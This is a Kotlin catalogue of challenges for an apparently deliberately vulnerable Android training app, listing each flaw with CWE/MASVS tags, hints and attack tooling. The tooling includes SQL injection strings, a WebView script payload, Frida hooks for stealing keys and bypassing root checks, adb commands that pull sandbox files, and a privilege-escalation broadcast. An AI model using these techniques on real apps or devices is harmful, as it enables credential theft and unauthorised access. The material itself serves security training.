package com.evilcorp.android.model

/** Single source of truth for UI totals, scoring and tests. Keep ids stable. */
object ChallengeCatalog {
    val all: List<Challenge> = listOf(
        Challenge(
            id = "prefs", title = "SharedPreferences Storage",
            description = "Session secrets written to SharedPreferences in plaintext.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-312", masvs = "STORAGE-1", maswe = "MASWE-0006", cvss = "5.0 (Medium)",
            hints = listOf(
                "Android keeps SharedPreferences as XML files inside the app sandbox.",
                "Look under /data/data/com.evilcorp.android/shared_prefs/.",
                "On a debuggable build: adb shell run-as com.evilcorp.android cat shared_prefs/evilcorp_session.xml",
            ),
            tooling = "adb shell run-as com.evilcorp.android ls shared_prefs\n" +
                "adb shell run-as com.evilcorp.android cat shared_prefs/evilcorp_session.xml\n\n" +
                "// Frida: log every SharedPreferences write\n" +
                "Java.perform(() => {\n" +
                "  const E = Java.use('android.app.SharedPreferencesImpl\$EditorImpl');\n" +
                "  E.putString.implementation = function (k, v) { console.log(k + ' = ' + v); return this.putString(k, v); };\n" +
                "});",
        ),
        Challenge(
            id = "sqli", title = "SQLite Injection",
            description = "Login query built by string concatenation against a local SQLite database.",
            difficulty = Difficulty.Medium, area = Area.Storage,
            cwe = "CWE-89", masvs = "CODE-4", maswe = "MASWE-0079", cvss = "7.5 (High)",
            hints = listOf(
                "The query is SELECT username, role, note FROM users WHERE username='…' AND password='…'.",
                "Try closing the quote yourself: ' OR 1=1 --",
                "You want the admin row: ' OR role='admin' --",
            ),
            tooling = "// Frida: print every SQL statement\n" +
                "Java.perform(() => {\n" +
                "  const DB = Java.use('android.database.sqlite.SQLiteDatabase');\n" +
                "  DB.rawQuery.overload('java.lang.String', '[Ljava.lang.String;').implementation = function (q, a) {\n" +
                "    console.log('SQL: ' + q); return this.rawQuery(q, a);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "secrets", title = "Hardcoded Secrets",
            description = "An API key compiled into the APK gates a privileged endpoint.",
            difficulty = Difficulty.Medium, area = Area.Storage,
            cwe = "CWE-798", masvs = "CRYPTO-2", maswe = "MASWE-0005", cvss = "7.5 (High)",
            hints = listOf(
                "The key never leaves the device, so it must be inside the APK.",
                "Decompile with jadx or run `apktool d` and grep for 'key'.",
                "The key is Base64-encoded in HardcodedSecretsLab.kt, decode it.",
            ),
            tooling = "apktool d app-debug.apk -o out && grep -ri 'EC_API' out/smali*\n" +
                "jadx -d out-jadx app-debug.apk   # open HardcodedSecretsLab\n" +
                "echo '<base64>' | base64 -d",
        ),
        Challenge(
            id = "logging", title = "Insecure Logging",
            description = "Credentials and a session token are written to logcat.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-532", masvs = "STORAGE-2", maswe = "MASWE-0001", cvss = "5.0 (Medium)",
            hints = listOf(
                "Press Login, then look at the system log, not the screen.",
                "adb logcat | grep EvilCorpAuth",
                "The token field in the log line is the flag.",
            ),
            tooling = "adb logcat -c && adb logcat -s EvilCorpAuth:D\n" +
                "adb logcat --pid=\$(adb shell pidof com.evilcorp.android)",
        ),
        Challenge(
            id = "crypto", title = "Broken Cryptography",
            description = "AES-ECB with a key hardcoded in the app protects the vault blob.",
            difficulty = Difficulty.Medium, area = Area.Crypto,
            cwe = "CWE-327", masvs = "CRYPTO-1", maswe = "MASWE-0020", cvss = "7.4 (High)",
            hints = listOf(
                "Identical plaintext blocks encrypt to identical ciphertext blocks in ECB mode.",
                "Find the 16-byte key in BrokenCryptoLab.kt (jadx).",
                "Decrypt the Base64 blob with AES/ECB/PKCS5Padding using that key.",
            ),
            tooling = "echo '<blob>' | base64 -d | openssl enc -d -aes-128-ecb -K \$(printf '<key>' | xxd -p)\n\n" +
                "// Frida: capture keys passed to javax.crypto\n" +
                "Java.perform(() => {\n" +
                "  const S = Java.use('javax.crypto.spec.SecretKeySpec');\n" +
                "  S.\$init.overload('[B', 'java.lang.String').implementation = function (k, a) {\n" +
                "    console.log(a + ' key=' + Java.use('java.lang.String').\$new(k)); return this.\$init(k, a);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "random", title = "Weak Random Generation",
            description = "A password-reset token comes from java.util.Random seeded with a leaked timestamp.",
            difficulty = Difficulty.Medium, area = Area.Crypto,
            cwe = "CWE-338", masvs = "CRYPTO-1", maswe = "MASWE-0027", cvss = "7.5 (High)",
            hints = listOf(
                "java.util.Random is a deterministic LCG: same seed, same output.",
                "The 'requested at' epoch second is the seed.",
                "token = java.util.Random(seed).nextLong().toString(36)",
            ),
            tooling = "// jshell or Kotlin script\n" +
                "jshell> new java.util.Random(<epochSeconds>L).nextLong()\n" +
                "jshell> Long.toString(new java.util.Random(<epochSeconds>L).nextLong(), 36)",
        ),
        Challenge(
            id = "webview", title = "WebView JavaScript Bridge",
            description = "Unsanitized HTML is rendered in a WebView that exposes a native JS interface.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-79", masvs = "PLATFORM-2", maswe = "MASWE-0068", cvss = "8.1 (High)",
            hints = listOf(
                "Your input is placed into the page without encoding, so HTML and script run.",
                "A Java object is exposed to JavaScript under the name EvilBridge.",
                "<script>document.body.innerText = EvilBridge.getFlag()</script>",
            ),
            tooling = "// Inject:\n<script>document.body.innerText = EvilBridge.getFlag()</script>\n\n" +
                "// Inspect via chrome://inspect (WebView debugging is enabled in this lab)\n" +
                "adb forward tcp:9222 localabstract:webview_devtools_remote_\$(adb shell pidof com.evilcorp.android)",
        ),
        Challenge(
            id = "provider", title = "Exported ContentProvider",
            description = "A ContentProvider is exported without permissions and returns internal notes.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-926", masvs = "PLATFORM-1", maswe = "MASWE-0063", cvss = "7.5 (High)",
            hints = listOf(
                "Check AndroidManifest.xml for android:exported=\"true\" on <provider>.",
                "The authority is com.evilcorp.android.notes.",
                "adb shell content query --uri content://com.evilcorp.android.notes/notes",
            ),
            tooling = "adb shell content query --uri content://com.evilcorp.android.notes/notes\n" +
                "adb shell dumpsys package com.evilcorp.android | grep -A3 -i provider\n" +
                "drozer console connect  ->  run app.provider.info -a com.evilcorp.android",
        ),
        Challenge(
            id = "deeplink", title = "Deep Link Abuse",
            description = "An exported activity trusts parameters from the evilcorp:// URL scheme.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-939", masvs = "PLATFORM-1", maswe = "MASWE-0058", cvss = "6.5 (Medium)",
            hints = listOf(
                "Find the <intent-filter> with the evilcorp scheme in the manifest.",
                "The handler supports a 'settings' host with a debug parameter.",
                "adb shell am start -a android.intent.action.VIEW -d \"evilcorp://settings?debug=1\"",
            ),
            tooling = "adb shell am start -a android.intent.action.VIEW -d \"evilcorp://settings?debug=1\"\n" +
                "adb shell am start -a android.intent.action.VIEW -d \"evilcorp://pay?to=attacker&amount=999\"",
        ),
        Challenge(
            id = "root", title = "Root Detection Bypass",
            description = "A client-side root check decides whether the secure area opens.",
            difficulty = Difficulty.Medium, area = Area.Resilience,
            cwe = "CWE-693", masvs = "RESILIENCE-1", maswe = "MASWE-0097", cvss = "4.3 (Medium)",
            hints = listOf(
                "The lab plants a synthetic su binary so the check always fires.",
                "The decision is a single boolean returned by RootChecker.isRooted().",
                "Hook it with Frida and return false. The indicator is re-planted on every attempt.",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const R = Java.use('com.evilcorp.android.labs.RootChecker');\n" +
                "  R.isRooted.implementation = function (ctx) { return false; };\n" +
                "});\n\n" +
                "# or: objection -g com.evilcorp.android explore -> android root disable\n" +
                "# or: patch the APK (apktool d, edit smali, apktool b, apksigner)",
        ),
        Challenge(
            id = "cleartext", title = "Cleartext HTTP Session",
            description = "Credentials and a session token travel over unencrypted HTTP.",
            difficulty = Difficulty.Medium, area = Area.Network,
            cwe = "CWE-319", masvs = "NETWORK-1", maswe = "MASWE-0050", cvss = "7.4 (High)",
            hints = listOf(
                "The manifest and network security config both permit cleartext traffic.",
                "Start the lab server, then forward its port to your computer.",
                "adb forward tcp:8080 tcp:8080 && curl -i -d 'user=alice&pass=wonderland' http://127.0.0.1:8080/login",
            ),
            tooling = "adb forward tcp:8080 tcp:8080\n" +
                "curl -i -d 'user=alice&pass=wonderland' http://127.0.0.1:8080/login\n" +
                "# look at the Set-Cookie header",
        ),
        Challenge(
            id = "external", title = "External Storage Leak",
            description = "A credentials backup is written to shared external storage.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-922", masvs = "STORAGE-2", maswe = "MASWE-0007", cvss = "5.5 (Medium)",
            hints = listOf(
                "Files under external storage are not private to the app.",
                "Path: /sdcard/Android/data/com.evilcorp.android/files/",
                "adb pull /sdcard/Android/data/com.evilcorp.android/files/backup_credentials.txt",
            ),
            tooling = "adb shell ls /sdcard/Android/data/com.evilcorp.android/files/\n" +
                "adb pull /sdcard/Android/data/com.evilcorp.android/files/backup_credentials.txt",
        ),
        Challenge(
            id = "broadcast", title = "Unprotected Broadcast Receiver",
            description = "An exported receiver accepts privilege changes from any app.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-927", masvs = "PLATFORM-1", maswe = "MASWE-0064", cvss = "7.8 (High)",
            hints = listOf(
                "Look for <receiver android:exported=\"true\"> and its intent-filter action.",
                "The receiver reads a string extra named role.",
                "adb shell am broadcast -a com.evilcorp.android.ACTION_PROMOTE --es role admin -n com.evilcorp.android/.labs.PromoteReceiver",
            ),
            tooling = "adb shell am broadcast -a com.evilcorp.android.ACTION_PROMOTE --es role admin \\\n" +
                "  -n com.evilcorp.android/.labs.PromoteReceiver",
        ),
        Challenge(
            id = "clipboard", title = "Clipboard Leakage",
            description = "A secret is copied to the system clipboard without the sensitive flag.",
            difficulty = Difficulty.Easy, area = Area.Platform,
            cwe = "CWE-200", masvs = "STORAGE-2", maswe = "MASWE-0053", cvss = "4.0 (Medium)",
            hints = listOf(
                "Any foreground app (and keyboards, clipboard managers) can read the clipboard.",
                "Press Copy, then paste into the field below.",
                "Hook ClipboardManager.setPrimaryClip to observe what the app copies.",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const C = Java.use('android.content.ClipboardManager');\n" +
                "  C.setPrimaryClip.implementation = function (clip) {\n" +
                "    console.log(clip.getItemAt(0).getText()); return this.setPrimaryClip(clip);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "pin", title = "Vulnerable Vault PIN",
            description = "A 4-digit PIN checked client-side with an unsalted MD5 and no lockout.",
            difficulty = Difficulty.Hard, area = Area.Auth,
            cwe = "CWE-307", masvs = "AUTH-2", maswe = "MASWE-0036", cvss = "6.8 (Medium)",
            hints = listOf(
                "There are only 10,000 possible PINs and the app never rate-limits attempts.",
                "The expected hash is embedded in PinVaultLab.kt, MD5 of the PIN.",
                "Brute-force offline: for i in 0000..9999, compare md5(i) with the embedded hash.",
            ),
            tooling = "for i in \$(seq -w 0 9999); do\n" +
                "  [ \"\$(printf \$i | md5)\" = \"<hash>\" ] && echo PIN=\$i && break\n" +
                "done",
        ),
        Challenge(
            id = "screenshot", title = "Screenshot Leakage",
            description = "A sensitive screen can be captured because FLAG_SECURE is not set.",
            difficulty = Difficulty.Easy, area = Area.Platform,
            cwe = "CWE-200", masvs = "PLATFORM-3", maswe = "MASWE-0055", cvss = "4.0 (Medium)",
            hints = listOf(
                "Without FLAG_SECURE the OS lets screenshots, screen recording and the recents thumbnail see the content.",
                "The flag is masked on screen. Capture the screen after pressing Reveal.",
                "adb exec-out screencap -p > shot.png",
            ),
            tooling = "adb exec-out screencap -p > shot.png\n" +
                "adb shell screenrecord /sdcard/rec.mp4",
        ),
    )

    fun byId(id: String): Challenge? = all.firstOrNull { it.id == id }
}
